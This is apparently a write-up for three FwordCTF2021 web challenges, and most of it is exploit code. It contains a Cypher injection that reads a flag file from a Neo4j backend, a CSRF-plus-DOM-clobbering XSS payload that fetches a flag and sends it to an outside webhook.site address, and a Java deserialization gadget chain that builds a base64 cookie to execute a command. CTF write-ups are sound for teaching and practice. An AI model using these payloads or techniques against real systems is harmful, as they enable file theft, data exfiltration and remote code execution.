# FwordCTF2021


## seoftw

redirect in front page + fetch redirect in backend page + neo4j read file

server.js

```javascript
const express = require('express');
const app = express();
const logger = require('morgan');

app.use(logger('dev'))

app.get('/', (req, res) => {
        return res.redirect('http://backend:5000/secret?name=Naruto"%20CALL%20{%20LOAD%20CSV%20FROM%20"file:///flag.txt"%20AS%20row%20RETURN%20row%20AS%20flag%20}%20RETURN%20flag;//');
});

app.listen(80)
```

## shusui

* Dom clobbering to get xss. 
* One really tricky part is that it can take either get request or post request as parameters to login. Seems a way to csrf. Besides, it use `if request.method=="GET":` to judge login method. So, in this scenario, it would be feasible to use `HEAD` request to get csrf.

```html
<script>
fetch("https://shisui.fword.tech/login?username=byc&password=123",
{
"method":"HEAD",
"credentials": "include",
  "redirect":"follow",
   "mode": "no-cors"
});
setInterval(() => {
window.open(`https://shisui.fword.tech/home?feedback=<a id=x href=clobbering data-y="fetch('/flag').then(r=>r.text()).then(r=>navigator.sendBeacon('https://webhook.site/ae3fe73f-3566-4bbf-aa5e-437f4dcba4e1',r));"><a id=showInfos><a id=SETTINGS name=check href=byc_404 data-timezone="123" data-location='1});eval(x.dataset.y)//'></a><a id=SETTINGS>`)
}, 3000);
</script>
```



## parrotOS

local unserialize gadget starts with a `compare` method. So same idea as the `CommonsBeanutils` gadget. RCE will be triggered when executing compare



```java
package top.bycsec.fwordctf;

import com.fword.utils.*;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class FwordExp {

    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        Truncate tr = new Truncate();
        setFieldValue(tr, "value", "calc.exe");

        Constructor declaredConstructor = Class.forName("com.fword.utils.UtilityEval").getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        UtilityEval evil = (UtilityEval) declaredConstructor.newInstance();

        Feedback poc = new Feedback();
        setFieldValue(poc, "f1", evil);
        setFieldValue(poc, "f2", tr);

        Question q = new Question();
        setFieldValue(q, "category", poc);

        UserComparator comparator = new UserComparator();
        setFieldValue(comparator, "questionObj", q);


        final PriorityQueue queue = new PriorityQueue<>(2, comparator);

        queue.add(new User("1"));
        queue.add(new User("1"));


        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(queue);
            objectOutputStream.close();
            String cookie = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
            System.out.println(cookie);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
```
